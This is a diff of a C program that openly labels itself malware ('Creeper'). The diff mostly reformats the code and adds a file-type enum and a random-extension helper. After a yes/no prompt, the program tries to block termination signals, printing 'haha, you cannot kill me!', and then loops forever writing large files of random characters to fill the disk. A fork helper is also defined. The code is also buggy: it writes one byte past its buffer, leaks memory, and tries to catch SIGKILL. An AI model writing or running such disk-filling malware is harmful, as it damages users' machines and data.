@@ -341,7 +341,6 @@ Public License instead of this License.
 
  */
 
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <locale.h>
@@ -354,78 +353,110 @@ Public License instead of this License.
 #include <signal.h>
 #define STUFF 5000
 #define BUF_LEN 5000
+
+typedef enum RANDOM_FILES
+{
+  XML,
+  C,
+  CPP,
+  JS,
+  TS,
+  TXT
+
+} RANDOM_FILE;
 static int counter = 0;
 unsigned int __bool = 0;
 char x = '0';
 const char *CHARS = {"abcdefghijklmnopqrstuvwxyz1234567890"};
-char *bigString(){
-    char *malloc_ret = (char*) malloc(BUF_LEN);
-    for(int i = 0; i < BUF_LEN;i++){
-        __bool = rand() % 1;
+char *bigString()
+{
+  char *malloc_ret = (char *)malloc(BUF_LEN);
+  for (int i = 0; i < BUF_LEN; i++)
+  {
+    __bool = rand() % 1;
 
-        if(__bool == 0){
-            malloc_ret[i] = tolower(CHARS[rand() % strlen(CHARS)]);
-        }
-        else
-        {
-            malloc_ret[i] = toupper(CHARS[rand() % strlen(CHARS)]);
-        }
+    if (__bool == 0)
+    {
+      malloc_ret[i] = tolower(CHARS[rand() % strlen(CHARS)]);
     }
-    malloc_ret[BUF_LEN] = '\0';
-    return malloc_ret;
+    else
+    {
+      malloc_ret[i] = toupper(CHARS[rand() % strlen(CHARS)]);
+    }
+  }
+  malloc_ret[BUF_LEN] = '\0';
+  return malloc_ret;
 }
-FILE *createAndLoadFile(int times){
-    char buffer[2048];
-    sprintf(buffer,"creeper-%d.xml",counter);
-    FILE *newFile = fopen(buffer,"w");
-    for(int i = 0;i < times;i++){
-        fprintf(newFile,"%s",bigString());
-    }
-    counter++;
-    fclose(newFile);
+FILE *createAndLoadFile(int times)
+{
+  char buffer[2048];
+  sprintf(buffer, "creeper-%d.xml", counter);
+  FILE *newFile = fopen(buffer, "w");
+  for (int i = 0; i < times; i++)
+  {
+    fprintf(newFile, "%s", bigString());
+  }
+  counter++;
+  fclose(newFile);
 }
 
-void handler(int num){
+void handler(int num)
+{
   printf("haha, you cannot kill me!");
 }
 
-void enableProtectionKill(){
-  signal(SIGHUP,handler);
-  signal(SIGINT,handler);
-  signal(SIGQUIT,handler);
-  signal(SIGILL,handler);
-  signal(SIGTRAP,handler);
-  signal(SIGABRT,handler);
-  signal(SIGKILL,handler);
+void enableProtectionKill()
+{
+  signal(SIGHUP, handler);
+  signal(SIGINT, handler);
+  signal(SIGQUIT, handler);
+  signal(SIGILL, handler);
+  signal(SIGTRAP, handler);
+  signal(SIGABRT, handler);
+  signal(SIGKILL, handler);
 }
 
-void enableForking(int ms){
+void enableForking(int ms)
+{
   fork();
   usleep(ms);
 }
-int main(void){
-    setlocale(LC_ALL,"");
-    srand(time(NULL));
-    printf("WARNING:This file is considered an malware, it will run in your machine and loads you hd with stuff.\n");
 
-    while(1){
-        printf("At executing, you assume the risk.\nRun?(S/N)");
-        setbuf(stdin,NULL);
-        scanf("%c",&x);
-        x = tolower(x);
+void getRandomExtension(char ret[3])
+{
+  for (int i = 0; i < 3; i++)
+  {
+    ret[i] = rand() % 255;
+  }
+}
+int main(void)
+{
+  setlocale(LC_ALL, "");
+  srand(time(NULL));
+  printf("WARNING:This file is considered an malware, it will run in your machine and loads you hd with stuff.\n");
 
-        if(x == 's'){
-            break;
-        }
-        else if(x == 'n'){
-            puts("Goodbye ;-;");
-            return EXIT_FAILURE;
-        }
+  while (1)
+  {
+    printf("At executing, you assume the risk.\nRun?(S/N)");
+    setbuf(stdin, NULL);
+    scanf("%c", &x);
+    x = tolower(x);
+
+    if (x == 's')
+    {
+      break;
     }
-    enableProtectionKill();
-    while(1){
-      printf("CREEPER");
-      createAndLoadFile(STUFF);
+    else if (x == 'n')
+    {
+      puts("Goodbye ;-;");
+      return EXIT_FAILURE;
     }
-    return EXIT_FAILURE;
+  }
+  enableProtectionKill();
+  while (1)
+  {
+    printf("CREEPER");
+    createAndLoadFile(STUFF);
+  }
+  return EXIT_FAILURE;
 }
